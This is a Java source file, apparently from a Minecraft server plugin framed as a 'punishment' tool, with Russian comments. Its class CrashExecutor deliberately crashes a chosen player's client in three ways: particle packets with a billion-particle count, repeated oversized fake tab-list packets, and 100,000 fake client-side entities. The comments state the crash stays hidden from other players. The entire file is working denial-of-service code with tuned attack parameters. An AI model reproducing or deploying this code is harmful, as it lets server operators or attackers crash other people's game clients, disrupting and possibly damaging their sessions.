package com.ultimateimprovments.punish;

import com.mojang.authlib.GameProfile;
import net.minecraft.core.particles.ParticleTypes;
import net.minecraft.network.chat.Component;
import net.minecraft.network.protocol.game.ClientboundAddEntityPacket;
import net.minecraft.network.protocol.game.ClientboundLevelParticlesPacket;
import net.minecraft.network.protocol.game.ClientboundPlayerInfoUpdatePacket;
import net.minecraft.server.level.ServerPlayer;
import net.minecraft.world.entity.EntityTypes;
import net.minecraft.world.level.GameType;
import net.minecraft.world.phys.Vec3;
import org.bukkit.Location;
import org.bukkit.craftbukkit.entity.CraftPlayer;
import org.bukkit.entity.Player;

import java.util.ArrayList;
import java.util.EnumSet;
import java.util.List;
import java.util.Random;
import java.util.UUID;

/**
 * 💥 CrashExecutor — исполнение краша клиента игрока-цели.
 * <p>
 * Все методы отправляют пакеты НАПРЯМУЮ в соединение {@code target}'а
 * (через {@code ServerPlayer#connection}), поэтому эффект виден ТОЛЬКО
 * клиенту цели — остальные игроки ничего не замечают.
 *
 * <ul>
 *   <li><b>{@link #crashWithParticles(Player)}</b> — огромный счётчик частиц
 *       (campfire signal smoke). Один {@code ClientboundLevelParticlesPacket}
 *       с count = 999_999_999: клиент пытается создать миллиард частиц → OOM.</li>
 *   <li><b>{@link #crashWithPacket(Player)}</b> — таб-флуд: максимально большой
 *       (впритык к лимиту протокола ~2 МБ) {@code ClientboundPlayerInfoUpdatePacket}
 *       с тысячами фейковых игроков и огромными именами, продублированный несколько раз.
 *       Клиент раздувает PlayerList и пытается отрендерить всё → фриз/OOM.</li>
 *   <li><b>{@link #crashWithEntities(Player)}</b> — тысячи виртуальных сущностей
 *       ({@code ClientboundAddEntityPacket} с фейковыми отрицательными entity-id),
 *       которые существуют только в клиенте цели.</li>
 * </ul>
 */
public final class CrashExecutor {

    private CrashExecutor() {}

    // =========================
    // КОНФИГУРАЦИЯ НАГРУЗКИ
    // =========================

    /** Сколько частиц в одном particle-пакете (как раньше: 999_999_999). */
    private static final int PARTICLE_COUNT = 999_999_999;
    /** Сколько копий particle-пакета отправляем. */
    private static final int PARTICLE_BURST = 3;

    /** Сколько фейковых игроков в одном tab-пакете. ~1 КБ на запись → ~1.9 МБ (максимум протокола). */
    private static final int TAB_ENTRIES = 1800;
    /** Длина display-name каждого фейкового игрока (символов). */
    private static final int TAB_NAME_LENGTH = 1000;
    /** Сколько копий tab-пакета отправляем подряд (~30 МБ суммарно за один тик). */
    private static final int TAB_BURST = 16;

    /** Сколько виртуальных сущностей создаём в клиенте цели (100k — гарантированный краш). */
    private static final int ENTITY_COUNT = 100_000;
    /** Радиус разброса сущностей вокруг цели (блоков). */
    private static final double ENTITY_SPREAD = 6.0;

    private static final Random RANDOM = new Random();

    // =========================
    // PARTICLE
    // =========================

    /**
     * Краш частицами — тот же способ, что был раньше: campfire signal smoke
     * с count = 999_999_999. Клиент цели пытается создать миллиард частиц → OOM.
     * В отличие от старого кода, пакет идёт только цели (не всем в радиусе).
     */
    public static void crashWithParticles(Player target) {
        Location loc = target.getLocation();
        double x = loc.getX();
        double y = loc.getY() + 1.0;
        double z = loc.getZ();

        for (int i = 0; i < PARTICLE_BURST; i++) {
            if (!target.isOnline()) return;
            ClientboundLevelParticlesPacket packet = new ClientboundLevelParticlesPacket(
                    ParticleTypes.CAMPFIRE_SIGNAL_SMOKE,
                    true,              // override limiter — частицы рендерятся всегда
                    true,              // always show
                    x, y, z,
                    0f, 0f, 0f,        // разброс
                    0f,                // скорость
                    PARTICLE_COUNT
            );
            send(target, packet);
        }
    }

    // =========================
    // PACKET — таб-флуд
    // =========================

    /**
     * Краш одним очень большим пакетом: {@code ClientboundPlayerInfoUpdatePacket}
     * с тысячами фейковых игроков, у каждого огромный display-name. Один пакет —
     * впритык к лимиту протокола (~2 МБ), продублирован {@link #TAB_BURST} раз.
     * Клиент цели добавляет всех в PlayerList и рендерит → жёсткий фриз/OOM.
     */
    public static void crashWithPacket(Player target) {
        EnumSet<ClientboundPlayerInfoUpdatePacket.Action> actions = EnumSet.of(
                ClientboundPlayerInfoUpdatePacket.Action.ADD_PLAYER,
                ClientboundPlayerInfoUpdatePacket.Action.UPDATE_GAME_MODE,
                ClientboundPlayerInfoUpdatePacket.Action.UPDATE_LISTED,
                ClientboundPlayerInfoUpdatePacket.Action.UPDATE_LATENCY,
                ClientboundPlayerInfoUpdatePacket.Action.UPDATE_DISPLAY_NAME
        );

        String filler = "A".repeat(TAB_NAME_LENGTH);

        for (int burst = 0; burst < TAB_BURST; burst++) {
            if (!target.isOnline()) return;
            List<ClientboundPlayerInfoUpdatePacket.Entry> entries = new ArrayList<>(TAB_ENTRIES);
            for (int i = 0; i < TAB_ENTRIES; i++) {
                UUID uuid = new UUID(burst * 0x1_0000_0000L + i, 0x6d_756c_7469L); // детерминированные UUID
                // Имя НЕ должно превышать 16 символов — это лимит протокола (Utf8String max 16).
                // Иначе серверный энкодер бросает EncoderException и игрока просто кикает.
                String hex = Long.toHexString(uuid.getMostSignificantBits() ^ uuid.getLeastSignificantBits());
                String name = "U" + hex.substring(0, Math.min(15, hex.length()));
                GameProfile profile = new GameProfile(uuid, name);
                entries.add(new ClientboundPlayerInfoUpdatePacket.Entry(
                        uuid,
                        profile,
                        true,                          // listed
                        0,                             // latency
                        GameType.SURVIVAL,
                        Component.literal(filler),     // огромный display-name
                        false,                         // show hat
                        0,                             // list order
                        null                           // chat session
                ));
            }
            send(target, new ClientboundPlayerInfoUpdatePacket(actions, entries));
        }
    }

    // =========================
    // ENTITY — виртуальные сущности
    // =========================

    /**
     * Краш виртуальными сущностями: {@code ENTITY_COUNT} пакетов
     * {@code ClientboundAddEntityPacket} с фейковыми отрицательными entity-id.
     * Клиент цели создаёт у себя тысячи сущностей, которых нет на сервере —
     * они видны только ему и существуют до перезахода.
     */
    public static void crashWithEntities(Player target) {
        Location loc = target.getLocation();

        for (int i = 0; i < ENTITY_COUNT; i++) {
            if (!target.isOnline()) return;
            double dx = (RANDOM.nextDouble() - 0.5) * 2.0 * ENTITY_SPREAD;
            double dy = (RANDOM.nextDouble() - 0.5) * 2.0 * ENTITY_SPREAD;
            double dz = (RANDOM.nextDouble() - 0.5) * 2.0 * ENTITY_SPREAD;

            ClientboundAddEntityPacket packet = new ClientboundAddEntityPacket(
                    Integer.MIN_VALUE + i,             // фейковый id — не конфликтует с реальными
                    UUID.randomUUID(),                 // фейковый uuid
                    loc.getX() + dx,
                    loc.getY() + dy,
                    loc.getZ() + dz,
                    RANDOM.nextFloat() * 360f,         // yRot
                    RANDOM.nextFloat() * 360f,         // xRot
                    EntityTypes.ZOMBIE,
                    0,                                 // data
                    Vec3.ZERO,                         // velocity
                    0d                                 // yHeadRot
            );
            send(target, packet);
        }
    }

    // =========================
    // SEND
    // =========================

    /**
     * Отправляет пакет напрямую в соединение цели (только её клиент видит).
     * Безопасен: если игрок вышел или соединение закрыто — молча пропускаем.
     */
    private static void send(Player target, net.minecraft.network.protocol.Packet<?> packet) {
        if (target == null || !target.isOnline()) return;
        try {
            ServerPlayer serverPlayer = ((CraftPlayer) target).getHandle();
            if (serverPlayer.connection == null) return;
            serverPlayer.connection.send(packet);
        } catch (Exception ignored) {
            // Игрок вышел/соединение оборвано посреди флуда — не критично.
        }
    }
}
